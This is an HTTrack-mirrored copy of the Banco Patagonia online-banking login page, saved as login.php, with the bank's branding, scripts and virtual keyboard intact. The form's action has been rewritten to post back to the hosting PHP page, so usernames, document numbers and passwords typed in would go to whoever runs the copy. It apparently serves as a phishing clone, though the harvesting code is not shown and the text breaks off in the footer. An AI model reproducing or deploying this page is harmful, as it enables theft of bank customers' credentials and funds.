<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//ES"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">






<html lang="es" xmlns="http://www.w3.org/1999/xhtml">
	
<!-- Mirrored from ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/login.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 06 Jun 2024 22:50:13 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
		

		
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
		<meta http-equiv="Pragma" content="no-cache" />
		
		
		<link href="https://ebankpersonas.bancopatagonia.com.ar/eBanking/styles/loginNuevo.css" type="text/css" rel="stylesheet" />
		<link href="https://ebankpersonas.bancopatagonia.com.ar/eBanking/styles/botonesLogin.css" type="text/css" rel="stylesheet" />
		<link href="https://ebankpersonas.bancopatagonia.com.ar/eBanking/styles/global.css" type="text/css" rel="stylesheet" />
		<script type='text/javascript' src='https://ebankpersonas.bancopatagonia.com.ar/eBanking/js/chkPass.js'></script>
		<script type='text/javascript' src='https://ebankpersonas.bancopatagonia.com.ar/eBanking/js/global.js'></script>
		<script type='text/javascript' src='https://ebankpersonas.bancopatagonia.com.ar/eBanking/js/login.js'></script>

		<script src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/js/fingerprint/vubrowserfp.min.js"></script>
	<script src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/js/fingerprint/VUFp.js"></script>
    <script type='text/javascript' src='https://ebankpersonas.bancopatagonia.com.ar/eBanking/dwr/engine.js'></script>
    <script type='text/javascript' src='https://ebankpersonas.bancopatagonia.com.ar/eBanking/dwr/interface/LoggerAJAX.js'></script>


<style id="antiClickjack">
    body{display:none !important;}
</style>





<link rel="stylesheet" href="https://ebankpersonas.bancopatagonia.com.ar/eBanking/styles/loginNuevo.css"
	type="text/css" />
<link rel="stylesheet" href="https://ebankpersonas.bancopatagonia.com.ar/eBanking/styles/vkey.css" type="text/css" />

<script type="text/javascript">
    if (self === top) {
        var antiClickjack = document.getElementById("antiClickjack");
        antiClickjack.parentNode.removeChild(antiClickjack);
    } else {
        top.location = self.location;
    }
</script>


<script src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/borders.js" type="text/javascript"></script>
<script type="text/javascript">
const url_passive_fingerprint = 'https://fingerprint.api.vusecurity.com/';
const timeout_in_milliseconds = '10000';


    function logError(error) {

        LoggerAJAX.logError(error , {callback:function(data){
            }
        });

    }

function pruebaFrames(cantFrames,mensaje){
	var iframes = document.getElementsByTagName("iframe")
	var total_iframes=0;
	var i;
	for (i=0; i<iframes.length; i++){
		if (iframes[i].src.length != 0)
			total_iframes++;
	}
	if (total_iframes > cantFrames)
	{
		alert(mensaje);
		return 1;
	}
	return 0;
}

function pruebaTextbox(cantTextBox,mensaje){
	var textbox;
	textbox = document.getElementsByTagName("input");
	var j=0;
	var total_textbox=0;
	while (j < textbox.length)
	{
		if(textbox[j].type=='text')
		{
			total_textbox++;
		}
		j++;
	}
	if (total_textbox > cantTextBox){
		alert(mensaje);
		return 1;
	}
	return 0;
}

function verificarAgregadosDinamicosLogin(cantFrames,cantTextBox){
	var mensajeError = 'Su maquina se encuentra afectada por un Virus que le impide seguir operando con Patagonia e-bank. Por favor comuníquese urgente al 0810-888-8500';
	var error = pruebaFrames(cantFrames, mensajeError);
	if (error == 0)
		error = pruebaTextbox(cantTextBox,mensajeError);
	return error;
}

function roll_over(img_name, img_src)
	   {
	   document[img_name].src = img_src;
	   }

	var focoBoton = false;
	var focoSubmit = true;
	function shadow(){
		document.getElementById("imgSeguridad").style.display = "none";
		var element = document.getElementById("footerLoginGral");
		element.style.height = "46px";
	}


	function ingresando(){
			clear_fields();
			if(verificarCamposVaciosLogin())
			{

				var formLogin = document.getElementById("formLogin");
				try{
					vuFingerprint(url_passive_fingerprint, timeout_in_milliseconds);
				} catch (e){
					console.log(e);
					formLogin.submit();
					window.status = "Abriendo pagina...";
				}
				
			}

	}


function enterKeyLogin1(evt) {
	var evt = (evt) ? evt : event;
	var charCode = (evt.which) ? evt.which : evt.keyCode;
	if (charCode == 13) {
		if (!focoBoton)
		{
			if (focoSubmit)
				verificarCamposVaciosLogin1();
		}
	}
}
function disableEnterKeyLogin1(evt) {
var evt = (evt) ? evt : event;
	var charCode = (evt.which) ? evt.which : evt.keyCode;
	if (charCode == 13) {
			return false;
		}
}


function verificarCamposVaciosLogin1(){
	var formLogin = document.getElementById("formLogin");
	var usuario = formLogin.username.value;
	document.body.onkeypress=disableEnterKeyLogin1;
	document.getElementById("botonAcceso").disabled=true;
	document.getElementById("botonAcceso").onclick= function(){return false;};
	var clave = formLogin.password.value;
	if((usuario == "" && document.getElementById("usernameDocumento")!=null && document.getElementById("usernameDocumento").value == "") || clave == "")
	{
		if(document.getElementById("documento").checked)
		{
			alert('Debe ingresar el número de Documento y una Clave para poder ingresar');
		}
		else
		{
			alert("Debe ingresar un Nombre de Usuario y una Clave para poder ingresar");
		}
		document.body.onkeypress=enterKeyLogin1;
		document.getElementById("botonAcceso").disabled=false;
		document.getElementById("botonAcceso").onclick= function(){clear_fields(); verificarCamposVaciosLogin1();};
	} else
		{
		var errorDiv = document.getElementById('errorDiv');
		if (errorDiv) {
			errorDiv.style.display='none';
		}
		var error = verificarAgregadosDinamicosLogin(5,2);
		if (error == 0)
		{
			document.getElementById('loadingDiv').style.display='';
			document.getElementById("botonAcceso").onmouseover="";
			document.getElementById("botonAcceso").onmouseout="";
			try{
					vuFingerprint(url_passive_fingerprint, timeout_in_milliseconds);
			} catch (e){
				console.log(e);
				formLogin.submit();
				window.status = "Abriendo pagina...";
			}
		}
		else
		{
			document.body.onkeypress=enterKeyLogin1;
			document.getElementById("botonAcceso").disabled=false;
			document.getElementById("botonAcceso").onclick= function(){clear_fields(); verificarCamposVaciosLogin1();};
		}
	}
}

	function clear_fields() {


		 for( var n = 0; n < document.forms.length; n++ ) {

		 for(var i = 0; i < document.forms[n].elements.length; i++) {

		 var er=document.getElementById(document.forms[n].elements[i].name+'.errors');
		 var er1=document.getElementById('errorDivRecuadro');
		 var er2=document.getElementById('tablaError');
		 if(er!=null){
		  er.parentNode.removeChild(er);
		 }
		 	if(er1!=null){er1.parentNode.removeChild(er1);}
		 	if(er2!=null){er2.parentNode.removeChild(er2);}
		 }
	}
}
	var newwindow = null;
	var newwindow2 = null;
	function poptastic(url)
	{
		if (newwindow2 != null){
			newwindow2.close();
			newwindow2 = null;
		}
		newwindow=window.open(url,'name','width=600,height=490,resizable=yes,scrollbars=yes,status=yes');
		if (window.focus) {newwindow.focus()}
	}
	function poptastic2(url)
	{
		if (newwindow != null){
			newwindow.close();
			newwindow = null;
		}
		newwindow2=window.open(url,'name','width=750,height=490,resizable=yes,scrollbars=yes,status=yes');
		if (window.focus) {newwindow2.focus()}
	}
	function crearUsuario(){
		window.location='https://ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/adhesion.htm';
	}

</script>
<script type="text/javascript"
	src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/js/teclado/jquery-3.6.0.min.js"></script>
<script type="text/javascript"
	src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/js/teclado/jquery-ui-personalized-1.5.2.min.js"></script>
<script type="text/javascript"
	src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/js/teclado/jquery-fieldselection.js"></script>
<script type="text/javascript" src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/js/teclado/vkeyboard.js"></script>
<script type="text/javascript" src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/js/JavaScript-Seal-v1.js"></script>

<script type="text/javascript" src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/js/login.js"></script>

<style>
#loginDocumento select {
	width: 70px !important;
	margin: 0px;
	line-height: 15px;
	height: 18px;
/* 	border: 1px solid #7F9DB9; */
}

#tipoDoc:hover {
	background:#ffffff;
	outline: 1px solid #000000;
	border-radius:3px;
}

#usernameDocumento:hover {
	background:#ffffff;
	outline: 1px solid #000000;
	border-radius:3px;
}

#username:hover {
	background:#ffffff;
	outline: 1px solid #000000;
	border-radius:3px;
}

#password:hover {
	background:#ffffff;
	outline: 1px solid #000000;
	border-radius:3px;
	border
}

#FormLink a:hover {
	background:transparent !important;  
 	outline: 1px solid #000000 !important; 
 	border-radius:3px !important; 
}

#showkeyboard:hover {
	background:transparent !important;  
 	outline: 1px solid #000000 !important; 
 	border-radius:3px !important; 
}

 #imagenBoton:hover { 
  	background:transparent;  
 	outline: 1px solid #000000; 
 	border-radius:3px; 
 } 

#botonCrearUsuarioClave:hover {
 	border: 2px solid #000000; 
 	border-radius:10px; 
}

#radiosTipoLogin {
	padding-left: 10%;
	line-height: 30px;
}

#radioLogin {
	float: left;
	padding-left: 30px;
	line-height: 30px;
}

#radioLogin input {
	background-color: #B3C8D9;
}

#footerLogin {
	clear: both;
	width: 100%;
	height: 170px;
	margin-left: 21px;
	margin-right: auto;
	margin-top: 0px;
	font-family: arial;
	font-size: 11px;
	color: #0C2E72;
}

#seguridad {
	width: 221px;
	height: 165px;
	float: left;
	background: transparent url(https://ebankpersonas.bancopatagonia.com.ar/eBanking/images/login/imgSeguridad.gif)
		no-repeat right top;
	margin: 0px;
	margin-bottom: 5px;
	padding: 0px;
}

#seguridad span b {
	font-weight: bold;
}

#ayuda {
	width: 219px;
	height: 165px;
	float: left;
	background: transparent url(https://ebankpersonas.bancopatagonia.com.ar/eBanking/images/login/imgAyuda.gif) no-repeat
		left top;
	margin: 0px;
	padding: 0px;
}

#ayuda span {
	font-weight: bold;
	margin-bottom: 50px;
	margin-left: 0px;
}

#footer span {
	font-size: 12px;
	font-weight: bold;
}

.p-bottom-10{
	padding-bottom: 10% !important;
}

.p-top-2{
	padding-top: 2% !important;
}
.create-btn{
	border: #0C2E72 1px solid;
	padding: 6px;
	padding-left: 8%;
	padding-right: 8%;
	background: #0C2E72;
	color: white;
	text-decoration: none;
	border-radius: 10px;
}
.create-btn:visited, .create-btn:hover {
	text-decoration: none;
}
#footer p {
	margin: 2px;
	padding: 3px;
}
.text-left {
	text-align: end;
	width: 93%;
}
</style>
<script type="text/javascript">
		$(document).ready(function() {

			document.getElementById("botonAcceso").disabled=false;
			document.body.onkeypress = enterKeyLogin1;
			verificarAgregadosDinamicosLogin(5,2);
		});

				function seleccionTipoLg(){
					var userNL="true";
					if(userNL==="true"){
						seleccionTipoLogin('alias');
					}else{
						seleccionTipoLogin('documento');
					}
				}
				function seleccionTipoLogin(tipo){

					if(tipo=='documento'){
						document.getElementById("documento").checked= true;
						document.getElementById("loginDocumento").style.display = "block";
				    	document.getElementById("loginAlias").style.display = "none";
				    	document.getElementById("usernameDocumento").focus();
                        document.getElementById("usernameDocumento").value = "";
				   }
				   if(tipo=='alias'){
				   		document.getElementById("alias").checked= true;
						document.getElementById("loginDocumento").style.display = "none";
				    	document.getElementById("loginAlias").style.display = "block";
				    	document.getElementById("username").focus();
                       document.getElementById("loginAlias").value = "";
				   }
				}
		</script>

		<script>
            $(window).on("load", function (e) {
                clear(); seleccionTipoLg(); ;
                sessionStorage.clear();
                
                sessionStorage.setItem("login", "true");
            });
		</script>
	</head>
	<body class="yui-skin-sam">

			<div id="page">

				<div id="logosHeader">
					<div id="headerIzq">
						<div id="logoEbank"></div>
					</div>
					<div id="headerDer">
						<div id="logoPatagoniaHeader"></div>
					</div>
				</div>
				
					<div id="linksLogin">
								<ul>
									<li><a href="#" onclick="window.open('http://sucursalesycajeros.bancopatagonia.com.ar/sucursales/'
	,'sucursales','width=753,height=530,resizable=yes,scrollbars=yes,status=yes')" tabindex="4">Sucursales y Cajeros</a>&nbsp;|&nbsp;</li>
									<li><a href="#" onclick="window.open('http://www.bancopatagonia.com.ar/ebank/personas/ayuda/index.shtml'
	,'ayuda','width=600,height=490,resizable=yes,scrollbars=yes,status=yes')" tabindex="5">Ayuda y canales de atención</a></li>
								</ul>
					</div>
				
				

			<div id="topLoginDiv" style="width: 100%;height:100%; margin-left:auto;margin-right: auto; margin-top :50px;">
				<style>
	input:hover{

	font-size: 14px;
 
	}
</style>

<div id="keyboard">
	<div id="" style="background:transparent; ">
		<div style="width: 60%; float:left; background-color: #B3C8D9; margin-bottom:3px; margin-right: 2px; "></div>
		<div style="background: #FFFFFF; width: 90px; margin-bottom:3px; float:right; margin-right: 30px;"><a href="#" id="showkeyboardX">cerrar teclado x</a></div>
	</div>
	<div id="caracteres" style="float:left; width:210px;" >


	<div id="row1" class="filasTeclas" style="margin:0px !important;">
		<div class="estiloTeclas"><input name="q" type="button" value="q" onmouseover="" onmouseout=""/></div>
		<div class="estiloTeclas"><input name="w" type="button" value="w" /></div>
		<div class="estiloTeclas"><input name="e" type="button" value="e" /></div>
		<div class="estiloTeclas"><input name="r" type="button" value="r" /></div>
		<div class="estiloTeclas"><input name="t" type="button" value="t" /></div>
		<div class="estiloTeclas"><input name="y" type="button" value="y" /></div>
		<div class="estiloTeclas"><input name="u" type="button" value="u" /></div>
		<div class="estiloTeclas"><input name="i" type="button" value="i" /></div>
		<div class="estiloTeclas"><input name="o" type="button" value="o" /></div>
		<div class="estiloTeclas"><input name="p" type="button" value="p" /></div>
	</div>

	<div id="row1_shift" class="filasTeclas" style="margin:0px !important;">
		<div class="estiloTeclas"><input name="Q" type="button" value="Q" /></div>
		<div class="estiloTeclas"><input name="W" type="button" value="W" /></div>
		<div class="estiloTeclas"><input name="E" type="button" value="E" /></div>
		<div class="estiloTeclas"><input name="R" type="button" value="R" /></div>
		<div class="estiloTeclas"><input name="T" type="button" value="T" /></div>
		<div class="estiloTeclas"><input name="Y" type="button" value="Y" /></div>
		<div class="estiloTeclas"><input name="U" type="button" value="U" /></div>
		<div class="estiloTeclas"><input name="I" type="button" value="I" /></div>
		<div class="estiloTeclas"><input name="O" type="button" value="O" /></div>
		<div class="estiloTeclas"><input name="P" type="button" value="P" /></div>
	</div>

	<div id="row2" class="filasTeclas">
		<div class="estiloTeclas"><input name="a" type="button" value="a" /></div>
		<div class="estiloTeclas"><input name="s" type="button" value="s" /></div>
		<div class="estiloTeclas"><input name="d" type="button" value="d" /></div>
		<div class="estiloTeclas"><input name="f" type="button" value="f" /></div>
		<div class="estiloTeclas"><input name="g" type="button" value="g" /></div>
		<div class="estiloTeclas"><input name="h" type="button" value="h" /></div>
		<div class="estiloTeclas"><input name="j" type="button" value="j" /></div>
		<div class="estiloTeclas"><input name="k" type="button" value="k" /></div>
		<div class="estiloTeclas"><input name="l" type="button" value="l" /></div>
		<div class="estiloTeclas"><input name="l" type="button" value="ñ" /></div>
		<div class="estiloTeclas"><input name="backspace" type="button" value="  " class="teclaBack"/></div>
	</div>

	<div id="row2_shift" class="filasTeclas">
		<div class="estiloTeclas"><input name="a" type="button" value="A" /></div>
		<div class="estiloTeclas"><input name="s" type="button" value="S" /></div>
		<div class="estiloTeclas"><input name="d" type="button" value="D" /></div>
		<div class="estiloTeclas"><input name="f" type="button" value="F" /></div>
		<div class="estiloTeclas"><input name="g" type="button" value="G" /></div>
		<div class="estiloTeclas"><input name="h" type="button" value="H" /></div>
		<div class="estiloTeclas"><input name="j" type="button" value="J" /></div>
		<div class="estiloTeclas"><input name="k" type="button" value="K" /></div>
		<div class="estiloTeclas"><input name="l" type="button" value="L" /></div>
		<div class="estiloTeclas"><input name="l" type="button" value="Ñ" /></div>
		<div class="estiloTeclas"><input name="backspace" type="button" value="  " class="teclaBack" /></div>
	</div>

	<div id="row3" class="filasTeclas">
		<div class="estiloTeclas"><input name="Shift" type="button" value=" " id="shift" class="teclaShift"/></div>
		<div class="estiloTeclas"><input name="z" type="button" value="z" /></div>
		<div class="estiloTeclas"><input name="x" type="button" value="x" /></div>
		<div class="estiloTeclas"><input name="c" type="button" value="c" /></div>
		<div class="estiloTeclas"><input name="v" type="button" value="v" /></div>
		<div class="estiloTeclas"><input name="b" type="button" value="b" /></div>
		<div class="estiloTeclas"><input name="n" type="button" value="n" /></div>
		<div class="estiloTeclas"><input name="m" type="button" value="m" /></div>
		<div class="estiloTeclas"><input name="Enter" type="button" value="   " class="teclaEnter" onclick="document.forms[0].submit();"/></div>
	</div>

	<div id="row3_shift" class="filasTeclas">
		<div class="estiloTeclas"><input name="Shift" type="button" value=" " id="shifton" class="teclaShift"/></div>
		<div class="estiloTeclas"><input name="Z" type="button" value="Z" /></div>
		<div class="estiloTeclas"><input name="X" type="button" value="X" /></div>
		<div class="estiloTeclas"><input name="C" type="button" value="C" /></div>
		<div class="estiloTeclas"><input name="V" type="button" value="V" /></div>
		<div class="estiloTeclas"><input name="B" type="button" value="B" /></div>
		<div class="estiloTeclas"><input name="N" type="button" value="N" /></div>
		<div class="estiloTeclas"><input name="M" type="button" value="M" /></div>
		<div class="estiloTeclas"><input name="Enter" type="button" value="   " class="teclaEnter" onclick="document.forms[0].submit();"/></div>
	</div>
</div>
	<div id="numeros" style="float:left; width:60px;">
	<div id="numerosF1" class="filasTeclas">
		<div class="estiloTeclas"><input name="1" type="button" value="1" /></div>
		<div class="estiloTeclas"><input name="2" type="button" value="2" /></div>
		<div class="estiloTeclas"><input name="3" type="button" value="3" /></div>
	</div>
	
	<div id="numerosF2" class="filasTeclas">
		<div class="estiloTeclas"><input name="4" type="button" value="4" /></div>
		<div class="estiloTeclas"><input name="5" type="button" value="5" /></div>
		<div class="estiloTeclas"><input name="6" type="button" value="6" /></div>
	</div>

	<div id="numerosF3" class="filasTeclas">
		<div class="estiloTeclas"><input name="7" type="button" value="7" /></div>
		<div class="estiloTeclas"><input name="8" type="button" value="8" /></div>
		<div class="estiloTeclas"><input name="9" type="button" value="9" /></div>
	</div>
	<div id="numerosF4" class="filasTeclas">
		<div class="estiloTeclas">&nbsp;</div>
		<div class="estiloTeclas"><input name="0" type="button" value="0" /></div>
	</div>
	</div>

</div>

	<div
		style="width: 780px; height: 310px; clear: both; margin-left: 21px; margin-top: 5px;">
		<div style="width: 297px; float: left; margin: 0;">
			<div style="width: 100%; background-color: #B3C8D9; height: 310px;">
				<div style="width: 80%;">
					<img src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/images/login/bienvenido.gif" border="0" alt="Bienvenido a Patagonia e-bank, su banco en internet"/>
				</div>
				<div
					style="width: 100%; font-family: Arial; font-size: 12px; font-weight: normal; text-align: left; margin: 5px 5px 5px 10px;">
					<form id="formLogin" method="post"
						action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
						
						<input type="hidden" name="" value=""/>
						
						<div id="FormLogin">
							Seleccione Documento o Usuario para ingresar.
						</div>

						<div id="FormLogin">

							<div id="radioTipoLogin">
								<div id="radioLogin">
									<input type="radio" id="alias" name="tipoLogin" value="alias"
										class="propInput"
										onclick="clear_fields(); seleccionTipoLogin('alias');" tabindex="7" />
									Usuario
								</div>
								<div id="radioLogin">
									<input type="radio" id="documento" name="tipoLogin"
										   value="documento" class="propInput"
										   onclick="clear_fields(); seleccionTipoLogin('documento');" tabindex="7" />
									Documento
								</div>
							</div>

						</div>
						

						<div id="FormLogin">
							<div id="loginDocumento">
<!-- 								<div id="FormText">Documento</div> -->
								<label for="usernameDocumento" id="FormText">Documento</label>
								<label for="tipoDoc" id="selectTipoDoc" style="display:none">Tipo de Documento</label>
								<div id="FormInputSpan">
									<select id="tipoDoc" name="tipoDoc" tabindex="8">
										
											<option value="DNI">DNI</option>
										
											<option value="CI">CI</option>
										
											<option value="PASAPORTE">PASAPORTE</option>
										
											<option value="LC">LC</option>
										
											<option value="LE">LE</option>
										
									</select> <input onBlur="focoSubmit=false;" onFocus="focoSubmit=true;"
										type="text" autocomplete="off" id="usernameDocumento" name="usernameDocumento"
										maxlength="11" class="propInput" tabindex="1"/>
								</div>
							</div>
						</div>

						

						<div id="FormLogin"  >
							<div id="loginAlias" class="p-bottom-10 p-top-2" style="display: none;">
<!-- 								<div id="FormText"> -->

<!-- 								</div> -->
								<label for="username" id="FormText">Usuario</label>
								<div id="FormInput">
									<input onBlur="focoSubmit=false;" onFocus="focoSubmit=true;"
										type="text" autocomplete="off" id="username" name="username" maxlength="15"
										class="propInput" tabindex="1"/>
								</div>
							</div>
						</div>

						
						<div id="FormLogin" class="p-bottom-10" >
<!-- 							<div id="FormText"> -->

<!-- 							</div> -->
							<label for="password" id="FormText">Clave</label>
							<div id="FormInput">
								<input onBlur="focoSubmit=false;" type="password" autocomplete="off"
									name="password" id="password" maxlength="8" tabindex="2"
									class="propInput"
									onFocus="clear_fields();focoSubmit=true;" label="Clave"/>
							</div>
						</div>

						
						<input id="fPrint" type="hidden" name="fPrint" value=""/>
						
						
						

						
						<div id="FormLine">
							<div
								style="margin-left: 23%; margin-right: auto; width: 100px">
								<a id="botonAcceso" name="botonAcceso" ondblClick="return false"
									onFocus="focoBoton = true;focoSubmit=true;"
									onBlur="focoBoton = false;focoSubmit=false;"
									onclick="clear_fields(); verificarCamposVaciosLogin1();"
									onMouseOver="roll_over('imagenBoton', 'https://ebankpersonas.bancopatagonia.com.ar/eBanking/images/botones/botonIngresarOff.gif');"
									onMouseOut="roll_over('imagenBoton', 'https://ebankpersonas.bancopatagonia.com.ar/eBanking/images/botones/botonIngresar.gif')"
									tabindex="3"><img
									src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/images/botones/botonIngresar.gif" border="0"
									name="imagenBoton"
									id="imagenBoton" 
									alt="Ingresar"/> </a>
							</div>
							<div id="tecladoVirtual"></div><style>
	input:hover{

	font-size: 14px;
 
	}
</style>

<div id="keyboard">
	<div id="" style="background:transparent; ">
		<div style="width: 60%; float:left; background-color: #B3C8D9; margin-bottom:3px; margin-right: 2px; "></div>
		<div style="background: #FFFFFF; width: 90px; margin-bottom:3px; float:right; margin-right: 30px;"><a href="#" id="showkeyboardX">cerrar teclado x</a></div>
	</div>
	<div id="caracteres" style="float:left; width:210px;" >


	<div id="row1" class="filasTeclas" style="margin:0px !important;">
		<div class="estiloTeclas"><input name="q" type="button" value="q" onmouseover="" onmouseout=""/></div>
		<div class="estiloTeclas"><input name="w" type="button" value="w" /></div>
		<div class="estiloTeclas"><input name="e" type="button" value="e" /></div>
		<div class="estiloTeclas"><input name="r" type="button" value="r" /></div>
		<div class="estiloTeclas"><input name="t" type="button" value="t" /></div>
		<div class="estiloTeclas"><input name="y" type="button" value="y" /></div>
		<div class="estiloTeclas"><input name="u" type="button" value="u" /></div>
		<div class="estiloTeclas"><input name="i" type="button" value="i" /></div>
		<div class="estiloTeclas"><input name="o" type="button" value="o" /></div>
		<div class="estiloTeclas"><input name="p" type="button" value="p" /></div>
	</div>

	<div id="row1_shift" class="filasTeclas" style="margin:0px !important;">
		<div class="estiloTeclas"><input name="Q" type="button" value="Q" /></div>
		<div class="estiloTeclas"><input name="W" type="button" value="W" /></div>
		<div class="estiloTeclas"><input name="E" type="button" value="E" /></div>
		<div class="estiloTeclas"><input name="R" type="button" value="R" /></div>
		<div class="estiloTeclas"><input name="T" type="button" value="T" /></div>
		<div class="estiloTeclas"><input name="Y" type="button" value="Y" /></div>
		<div class="estiloTeclas"><input name="U" type="button" value="U" /></div>
		<div class="estiloTeclas"><input name="I" type="button" value="I" /></div>
		<div class="estiloTeclas"><input name="O" type="button" value="O" /></div>
		<div class="estiloTeclas"><input name="P" type="button" value="P" /></div>
	</div>

	<div id="row2" class="filasTeclas">
		<div class="estiloTeclas"><input name="a" type="button" value="a" /></div>
		<div class="estiloTeclas"><input name="s" type="button" value="s" /></div>
		<div class="estiloTeclas"><input name="d" type="button" value="d" /></div>
		<div class="estiloTeclas"><input name="f" type="button" value="f" /></div>
		<div class="estiloTeclas"><input name="g" type="button" value="g" /></div>
		<div class="estiloTeclas"><input name="h" type="button" value="h" /></div>
		<div class="estiloTeclas"><input name="j" type="button" value="j" /></div>
		<div class="estiloTeclas"><input name="k" type="button" value="k" /></div>
		<div class="estiloTeclas"><input name="l" type="button" value="l" /></div>
		<div class="estiloTeclas"><input name="l" type="button" value="ñ" /></div>
		<div class="estiloTeclas"><input name="backspace" type="button" value="  " class="teclaBack"/></div>
	</div>

	<div id="row2_shift" class="filasTeclas">
		<div class="estiloTeclas"><input name="a" type="button" value="A" /></div>
		<div class="estiloTeclas"><input name="s" type="button" value="S" /></div>
		<div class="estiloTeclas"><input name="d" type="button" value="D" /></div>
		<div class="estiloTeclas"><input name="f" type="button" value="F" /></div>
		<div class="estiloTeclas"><input name="g" type="button" value="G" /></div>
		<div class="estiloTeclas"><input name="h" type="button" value="H" /></div>
		<div class="estiloTeclas"><input name="j" type="button" value="J" /></div>
		<div class="estiloTeclas"><input name="k" type="button" value="K" /></div>
		<div class="estiloTeclas"><input name="l" type="button" value="L" /></div>
		<div class="estiloTeclas"><input name="l" type="button" value="Ñ" /></div>
		<div class="estiloTeclas"><input name="backspace" type="button" value="  " class="teclaBack" /></div>
	</div>

	<div id="row3" class="filasTeclas">
		<div class="estiloTeclas"><input name="Shift" type="button" value=" " id="shift" class="teclaShift"/></div>
		<div class="estiloTeclas"><input name="z" type="button" value="z" /></div>
		<div class="estiloTeclas"><input name="x" type="button" value="x" /></div>
		<div class="estiloTeclas"><input name="c" type="button" value="c" /></div>
		<div class="estiloTeclas"><input name="v" type="button" value="v" /></div>
		<div class="estiloTeclas"><input name="b" type="button" value="b" /></div>
		<div class="estiloTeclas"><input name="n" type="button" value="n" /></div>
		<div class="estiloTeclas"><input name="m" type="button" value="m" /></div>
		<div class="estiloTeclas"><input name="Enter" type="button" value="   " class="teclaEnter" onclick="document.forms[0].submit();"/></div>
	</div>

	<div id="row3_shift" class="filasTeclas">
		<div class="estiloTeclas"><input name="Shift" type="button" value=" " id="shifton" class="teclaShift"/></div>
		<div class="estiloTeclas"><input name="Z" type="button" value="Z" /></div>
		<div class="estiloTeclas"><input name="X" type="button" value="X" /></div>
		<div class="estiloTeclas"><input name="C" type="button" value="C" /></div>
		<div class="estiloTeclas"><input name="V" type="button" value="V" /></div>
		<div class="estiloTeclas"><input name="B" type="button" value="B" /></div>
		<div class="estiloTeclas"><input name="N" type="button" value="N" /></div>
		<div class="estiloTeclas"><input name="M" type="button" value="M" /></div>
		<div class="estiloTeclas"><input name="Enter" type="button" value="   " class="teclaEnter" onclick="document.forms[0].submit();"/></div>
	</div>
</div>
	<div id="numeros" style="float:left; width:60px;">
	<div id="numerosF1" class="filasTeclas">
		<div class="estiloTeclas"><input name="1" type="button" value="1" /></div>
		<div class="estiloTeclas"><input name="2" type="button" value="2" /></div>
		<div class="estiloTeclas"><input name="3" type="button" value="3" /></div>
	</div>
	
	<div id="numerosF2" class="filasTeclas">
		<div class="estiloTeclas"><input name="4" type="button" value="4" /></div>
		<div class="estiloTeclas"><input name="5" type="button" value="5" /></div>
		<div class="estiloTeclas"><input name="6" type="button" value="6" /></div>
	</div>

	<div id="numerosF3" class="filasTeclas">
		<div class="estiloTeclas"><input name="7" type="button" value="7" /></div>
		<div class="estiloTeclas"><input name="8" type="button" value="8" /></div>
		<div class="estiloTeclas"><input name="9" type="button" value="9" /></div>
	</div>
	<div id="numerosF4" class="filasTeclas">
		<div class="estiloTeclas">&nbsp;</div>
		<div class="estiloTeclas"><input name="0" type="button" value="0" /></div>
	</div>
	</div>

</div>

							<div class="text-left">
								<img src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/images/iconos/tecladoVirtual.png" style="vertical-align: middle;left;padding-bottom:5px;width:15px">
								<a href="#" id="showkeyboard" title="Escriba su contrase&#241;a usando un teclado virtual." tabindex="-1">Teclado Virtual </a>
							</div>
						</div>
						<div id="FormLine" style="padding-right: 15px;">
							<img src='https://ebankpersonas.bancopatagonia.com.ar/eBanking/images/login/punteadaBlanca.gif' border='0' /><br />
						</div>
						<div id="FormLine"></div>

					</form>
					<div id="tecladoVirtual"
						style="visibility: hidden; position: relative;"></div>

<!-- 					<div id="FormLine" style="margin-top: 2px; # margin-top: 0px;"> -->
<!-- 						<div style="float: left;"> -->

<!-- 						</div> -->
<!-- 						<div> -->
<!-- 							&nbsp;Si accede desde una PC P&uacute;blica:&nbsp;<a href="#" -->
<!-- 								id="showkeyboard" -->


<!-- 						</div> -->
<!-- 					</div> -->

					<div id="FormLine" style="margin-top: 5px; # margin-top: 0px;">
						<div>
							
						</div>

					</div>
					<div id="FormLine">
							<div style="margin-left: 2%; margin-right: auto; margin-top: 4%; height: 25px;padding-top:3px; _height: 30px; *height: 20px;">
								<div><a class="create-btn" href="https://credenciales.bancopatagonia.com.ar/?canal=EB" id="botonCrearUsuarioClave">No tengo Usuario/Clave o no lo recuerdo.</a><span></span></div>
							</div>
						</div>
					<div id="FormLine3">

						<div style="float: left;"></div>

					</div>


					<div id="loadingDiv"
						style="color: #0C2E72; display: none; margin-left: 33%; _margin-left: 17%; font-weight: bold; float: left; clear: both;">
						
						Ingresando...
					</div>
				</div>
			</div>
			<div id="loginAyuda"></div>
		</div>

		<!-- Capa 1 -->
		
		
			<div style="float: left; height: 310px; overflow: hidden; text-align: left; margin-top: 0px;">
				<a  href="login.php#"/>
					<img src="https://ebankpersonas.bancopatagonia.com.ar/eBanking/marketing/NuevaDefault_Fraudes_440x310_1679419854461.jpg" alt="Fraudes" height="310px" width="440px"  style="border: none;"/>
				</a>
			</div>
		
		
	</div>
	<div id="footerLogin">

		<!-- Capa 2 y 3 -->
		
		<!-- 			<div style="margin-top: 90px; text-align: center; border: 1px solid red;" -->
		<!-- 				title='Haga Click para Verificar - Este sitio cuenta con un Certificado SSL de VeriSign para asegurar la confidencialidad de sus comunicaciones.'> -->
